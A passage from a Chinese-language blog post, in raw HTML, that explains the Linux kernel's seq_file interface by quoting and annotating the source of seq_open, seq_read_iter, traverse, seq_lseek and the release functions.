FMODE_PWRITE here 位。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若一个 seq_files 的使用者：</span><br><span class="hljs-comment"> * a) 实现了 file.write() 且 b) 想要支持 pwrite()</span><br><span class="hljs-comment"> * 使用者需要在自己的 file.open() 中在调用 seq_open() 后再设置 FMODE_PWRITE。</span><br><span class="hljs-comment"> */</span><br>file-&gt;f_mode &amp;= ~FMODE_PWRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(seq_open);<br></code></pre></td></tr></table></figure><p>这个函数有一个更常用的 wrapper 叫 <code>__seq_open_private()</code> ，主要就是帮开发者多 kmalloc() 一个内存对象放到 <code>seq_file::private</code> 中，这里不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__seq_open_private(<span class="hljs-keyword">struct</span> file *f, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seq_operations *ops,<br><span class="hljs-type">int</span> psize)<br>&#123;<br><span class="hljs-type">int</span> rc;<br><span class="hljs-type">void</span> *private;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">seq</span>;</span><br><br>private = kzalloc(psize, GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (private == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out;<br><br>rc = seq_open(f, ops);<br><span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free;<br><br>seq = f-&gt;private_data;<br>seq-&gt;private = private;<br><span class="hljs-keyword">return</span> private;<br><br>out_free:<br>kfree(private);<br>out:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>EXPORT_SYMBOL(__seq_open_private);<br></code></pre></td></tr></table></figure><h2 id="（⭐核心）seq-read-：读取序列文件"><a href="#（⭐核心）seq-read-：读取序列文件" class="headerlink" title="（⭐核心）seq_read() ：读取序列文件"></a>（⭐核心）seq_read() ：读取序列文件</h2><p><code>seq_read()</code> 是正常 VFS 路径上 <code>read()</code> 会调用的函数，因为对于序列文件接口而言我们将函数表中的函数指针指定为该函数，不过这个函数主要是对 <code>seq_read_iter()</code> 的包装，在调用之前简单初始化了写入目标记录 <code>iovec</code> 与操作记录块 <code>kiocb</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_read -序列文件的 -&gt;read() 方法.</span><br><span class="hljs-comment"> *@file: 要读取的源文件</span><br><span class="hljs-comment"> *@buf: 要读入的目标缓冲区</span><br><span class="hljs-comment"> *@size: 最大读取字节</span><br><span class="hljs-comment"> *@ppos: 当前文件位置</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Ready-made -&gt;f_op-&gt;read()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> size, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> &#123; .iov_base = buf, .iov_len = size&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">iter</span>;</span><br><span class="hljs-type">ssize_t</span> ret;<br><br>init_sync_kiocb(&amp;kiocb, file);<br>iov_iter_init(&amp;iter, ITER_DEST, &amp;iov, <span class="hljs-number">1</span>, size);<br><br>kiocb.ki_pos = *ppos;<br>ret = seq_read_iter(&amp;kiocb, &amp;iter);<br>*ppos = kiocb.ki_pos;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(seq_read);<br></code></pre></td></tr></table></figure><blockquote><p> 什么，你还不知道 iovec、 kiocb、iov_iter 是什么东西？简单来说就是在内核 IO 中用于存放操作信息的数据结构，前者是基础结构，后两者主要配对用于异步 IO：</p><ul><li>iovec：<code>io vector</code>，表示一块带长度的缓冲区</li><li>kiocb：<code>kernel i/o call back</code> ，记录文件侧 IO 信息，包括文件指针、当前偏移等</li><li>iov_iter ：<code>iovec iterator</code> ，用来操作 iovec 的迭代器，记录内存侧 IO 信息，包括内存地址、当前偏移等</li></ul></blockquote><p>下面我们来到序列文件读取的核心函数 <code>seq_read_iter()</code> ，首先会检查文件侧偏移，若是 0 则将序列文件的序列对象偏移与读取字节数也都设为 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ready-made -&gt;f_op-&gt;read_iter()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br><span class="hljs-type">size_t</span> copied = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> n;<br><span class="hljs-type">void</span> *p;<br><span class="hljs-type">int</span> err = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(iter))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>mutex_lock(&amp;m-&gt;lock);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * if request is to read from zero offset, reset iterator to first</span><br><span class="hljs-comment"> * record as it might have been already advanced by previous requests</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (iocb-&gt;ki_pos == <span class="hljs-number">0</span>) &#123;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>若是文件侧偏移与序列文件读取偏移不等则调用 <code>traverse()</code> 函数处理，如果出错直接跳到 <code>Done</code> 进行收尾，否则将序列文件偏移与文件偏移进行同步：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Don&#x27;t assume ki_pos is where we left it */</span><br><span class="hljs-keyword">if</span> (unlikely(iocb-&gt;ki_pos != m-&gt;read_pos)) &#123;<br><span class="hljs-keyword">while</span> ((err = traverse(m, iocb-&gt;ki_pos)) == -EAGAIN)<br>;<br><span class="hljs-keyword">if</span> (err) &#123;<br><span class="hljs-comment">/* With prejudice... */</span><br>m-&gt;read_pos = <span class="hljs-number">0</span>;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> Done;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;read_pos = iocb-&gt;ki_pos;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>traverse()</code> 函数有点类似一个小的 <code>seq_read_iter()</code> 的核心，作用其实是 <strong>将序列文件的偏移同步到指定的偏移值</strong> ，这里是<strong>同步到文件侧记录的偏移</strong> ：</p><ul><li>初始化从第一个序列数据对象开始读取，检查序列文件的临时缓冲区是否分配</li><li>调用 <code>op-&gt;start()</code> 初始化后进入读取循环：<ul><li>首先调用 <code>op-&gt;show()</code> 打印到临时缓冲区上</li><li>调用 <code>seq_has_overflowed()</code> 检查临时缓冲区是否读满，满则跳到 <code>Eoverflow</code> 标签重新分配一块更大的内存，需要注意的是 <code>traverse()</code> 的作用主要是进行正式读取前的偏移同步，因此不会保存前面读取的数据</li><li>调用 <code>op-&gt;next()</code> 移动到下个序列数据对象，若本次超出预期偏移则减去对应数据量大小并退出循环，注意这里额外用了一个变量 <code>pos</code> 记录读取的数据量，且每次完成读取会清空临时缓冲区读取计数 <code>m-&gt;count</code> 加到 <code>pos</code> 上</li><li>若完成读取到指定偏移的任务则退出循环</li></ul></li><li>调用 <code>op-&gt;stop()</code> 终止读取并返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">traverse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> offset)</span><br>&#123;<br><span class="hljs-type">loff_t</span> pos = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> error = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> *p;<br><br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = m-&gt;from = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!offset)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!m-&gt;buf) &#123;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br><span class="hljs-keyword">while</span> (p) &#123;<br>error = PTR_ERR(p);<br><span class="hljs-keyword">if</span> (IS_ERR(p))<br><span class="hljs-keyword">break</span>;<br>error = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (unlikely(error)) &#123;<br>error = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (seq_has_overflowed(m))<br><span class="hljs-keyword">goto</span> Eoverflow;<br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">if</span> (pos + m-&gt;count &gt; offset) &#123;<br>m-&gt;from = offset - pos;<br>m-&gt;count -= m-&gt;from;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pos += m-&gt;count;<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (pos == offset)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>m-&gt;op-&gt;stop(m, p);<br><span class="hljs-keyword">return</span> error;<br><br>Eoverflow:<br>m-&gt;op-&gt;stop(m, p);<br>kvfree(m-&gt;buf);<br>m-&gt;count = <span class="hljs-number">0</span>;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size &lt;&lt;= <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> !m-&gt;buf ? -ENOMEM : -EAGAIN;<br>&#125;<br></code></pre></td></tr></table></figure><p>回到 <code>seq_read_iter()</code> ，接下来首先检查 <code>buf</code> 是否分配，之后检查 <code>buf</code> 上是否有数据 <code>m-&gt;count != 0</code> ，若是则拷贝到 <code>iovec</code> 所指示的内存上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* grab buffer if we didn&#x27;t have one */</span><br><span class="hljs-keyword">if</span> (!m-&gt;buf) &#123;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">goto</span> Enomem;<br>&#125;<br><span class="hljs-comment">// something left in the buffer - copy it out first</span><br><span class="hljs-keyword">if</span> (m-&gt;count) &#123;<br>n = copy_to_iter(m-&gt;buf + m-&gt;from, m-&gt;count, iter);<br>m-&gt;count -= n;<br>m-&gt;from += n;<br>copied += n;<br><span class="hljs-keyword">if</span> (m-&gt;count)<span class="hljs-comment">// hadn&#x27;t managed to copy everything</span><br><span class="hljs-keyword">goto</span> Done;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是预检查部分，作用是 <strong>进行一次读取，并检查缓冲区大小是否足够</strong> ：</p><ul><li>首先初始化序列文件临时缓冲区的起始偏移为 0，调用 <code>op-&gt;start()</code>  进行初始化，然后进入读取循环：<ul><li>首先调用 <code>op-&gt;show()</code> 打印当前序列数据对象到临时缓冲区，若跳过（如 <code>SEQ_SKIP</code> ）则当前轮的读取长度（ <code>m-&gt;count</code> ）记为 <code>0</code> ，并开始下轮循环</li><li>若临时缓冲区<strong>未满</strong> ，跳到 Fill 标签 <strong>开始正式的继续读取</strong> ，否则调用 <code>op-&gt;stop()</code> 停止并<strong>重新分配一个更大的缓冲区</strong>，之后重新读取当前序列数据对象</li></ul></li><li>若正常退出循环（break），说明读取失败，调用 <code>op-&gt;stop()</code> 停止并直接跳到 <code>Done</code> 标签进行收尾</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// get a non-empty record in the buffer</span><br>m-&gt;from = <span class="hljs-number">0</span>;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>err = PTR_ERR(p);<br><span class="hljs-keyword">if</span> (!p || IS_ERR(p))<span class="hljs-comment">// EOF or an error</span><br><span class="hljs-keyword">break</span>;<br>err = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">// hard error</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (unlikely(err))<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (unlikely(!m-&gt;count)) &#123; <span class="hljs-comment">// empty record</span><br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!seq_has_overflowed(m)) <span class="hljs-comment">// got it</span><br><span class="hljs-keyword">goto</span> Fill;<br><span class="hljs-comment">// need a bigger buffer</span><br>m-&gt;op-&gt;stop(m, p);<br>kvfree(m-&gt;buf);<br>m-&gt;count = <span class="hljs-number">0</span>;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size &lt;&lt;= <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">goto</span> Enomem;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>&#125;<br><span class="hljs-comment">// EOF or an error</span><br>m-&gt;op-&gt;stop(m, p);<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> Done;<br></code></pre></td></tr></table></figure><p>接下来就是核心的数据读取部分了：</p><ul><li>核心还是一个读取循环，不过前面预读取时已经 <code>start()</code> 过了所以这里直接开始读取：<ul><li>首先直接调用 <code>op-&gt;next()</code> 获取下一个序列数据对象（因为前面已经读过一次了），若开发者定义的该函数没有更新 <code>m-&gt;index</code> 则会手动自增，获取出错则跳出循环</li><li>若缓冲区上已有数据量大于 iovec 迭代器剩余量（<code>iov_iter_count(iter)</code>）则跳出循环</li><li>调用 <code>op-&gt;show()</code> 将新获取到的序列数据对象打印到缓冲区上，若溢出则跳出循环，注意这里的 <code>offs</code> 记录的是当前次循环开始前的 <code>m-&gt;count</code></li></ul></li><li>接下来调用 <code>op-&gt;stop()</code> 停止，并调用 <code>copy_to_iter()</code> 将临时缓冲区上数据拷贝到 iovec 迭代器所指示的 iovec 所指示的内存上</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">Fill:<br><span class="hljs-comment">// one non-empty record is in the buffer; if they want more,</span><br><span class="hljs-comment">// try to fit more in, but in any case we need to advance</span><br><span class="hljs-comment">// the iterator once for every record shown.</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-type">size_t</span> offs = m-&gt;count;<br><span class="hljs-type">loff_t</span> pos = m-&gt;index;<br><br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">if</span> (pos == m-&gt;index) &#123;<br>pr_info_ratelimited(<span class="hljs-string">&quot;buggy .next function %ps did not update position index\n&quot;</span>,<br>    m-&gt;op-&gt;next);<br>m-&gt;index++;<br>&#125;<br><span class="hljs-keyword">if</span> (!p || IS_ERR(p))<span class="hljs-comment">// no next record for us</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (m-&gt;count &gt;= iov_iter_count(iter))<br><span class="hljs-keyword">break</span>;<br>err = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (err &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>m-&gt;count = offs;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err || seq_has_overflowed(m)) &#123;<br>m-&gt;count = offs;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>m-&gt;op-&gt;stop(m, p);<br>n = copy_to_iter(m-&gt;buf, m-&gt;count, iter);<br>copied += n;<br>m-&gt;count -= n;<br>m-&gt;from = n;<br></code></pre></td></tr></table></figure><p>最后就是一些常规的收尾工作，例如在序列文件与 kiocb 中记录拷贝的字节数等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">Done:<br><span class="hljs-keyword">if</span> (unlikely(!copied)) &#123;<br>copied = m-&gt;count ? -EFAULT : err;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>iocb-&gt;ki_pos += copied;<br>m-&gt;read_pos += copied;<br>&#125;<br>mutex_unlock(&amp;m-&gt;lock);<br><span class="hljs-keyword">return</span> copied;<br>Enomem:<br>err = -ENOMEM;<br><span class="hljs-keyword">goto</span> Done;<br>&#125;<br>EXPORT_SYMBOL(seq_read_iter);<br></code></pre></td></tr></table></figure><p>不难看出序列文件接口的读取实现其实非常的简洁</p><h2 id="seq-lseek-：序列文件偏移操作"><a href="#seq-lseek-：序列文件偏移操作" class="headerlink" title="seq_lseek()：序列文件偏移操作"></a>seq_lseek()：序列文件偏移操作</h2><p>这个函数比较简洁，主要就是移动当前的序列文件偏移，对于相对偏移值（<code>SEEK_CUR</code> 路径）会先转换成绝对偏移值，进行偏移值计算的路径归一化，偏移值移动则主要靠 <code>traverse()</code> 完成，前文已经讲过故这里不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_lseek -序列文件的 -&gt;llseek() 方法</span><br><span class="hljs-comment"> *@file: the file in question</span><br><span class="hljs-comment"> *@offset: 新的偏移值</span><br><span class="hljs-comment"> *@whence: 0 for 绝对值, 1 for 相对位置</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Ready-made -&gt;f_op-&gt;llseek()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">loff_t</span> <span class="hljs-title function_">seq_lseek</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">loff_t</span> offset, <span class="hljs-type">int</span> whence)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> file-&gt;private_data;<br><span class="hljs-type">loff_t</span> retval = -EINVAL;<br><br>mutex_lock(&amp;m-&gt;lock);<br><span class="hljs-keyword">switch</span> (whence) &#123;<br><span class="hljs-keyword">case</span> SEEK_CUR:<br>offset += file-&gt;f_pos;<br>fallthrough;<br><span class="hljs-keyword">case</span> SEEK_SET:<br><span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>retval = offset;<br><span class="hljs-keyword">if</span> (offset != m-&gt;read_pos) &#123;<br><span class="hljs-keyword">while</span> ((retval = traverse(m, offset)) == -EAGAIN)<br>;<br><span class="hljs-keyword">if</span> (retval) &#123;<br><span class="hljs-comment">/* with extreme prejudice... */</span><br>file-&gt;f_pos = <span class="hljs-number">0</span>;<br>m-&gt;read_pos = <span class="hljs-number">0</span>;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;read_pos = offset;<br>retval = file-&gt;f_pos = offset;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>file-&gt;f_pos = offset;<br>&#125;<br>&#125;<br>mutex_unlock(&amp;m-&gt;lock);<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>EXPORT_SYMBOL(seq_lseek);<br></code></pre></td></tr></table></figure><h2 id="seq-release-：关闭序列文件"><a href="#seq-release-：关闭序列文件" class="headerlink" title="seq_release()：关闭序列文件"></a>seq_release()：关闭序列文件</h2><p>这个函数主要是进行释放内存的收尾工作，不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_release -free the structures associated with sequential file.</span><br><span class="hljs-comment"> *@file: file in question</span><br><span class="hljs-comment"> *@inode: its inode</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Frees the structures associated with sequential file; can be used</span><br><span class="hljs-comment"> *as -&gt;f_op-&gt;release() if you don&#x27;t have private data to destroy.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> file-&gt;private_data;<br>kvfree(m-&gt;buf);<br>kmem_cache_free(seq_file_cache, m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(seq_release);<br></code></pre></td></tr></table></figure><p>对于 <code>__seq_open_private()</code> ，也有一个对应的关闭函数 <code>seq_release_private()</code> ，同样是在 <code>seq_release()</code> 上的 wrapper，不过会帮你释放掉 <code>seq_file::private</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">seq_release_private</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">seq</span> =</span> file-&gt;private_data;<br><br>kfree(seq-&gt;private);<br>seq-&gt;private = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> seq_release(inode, 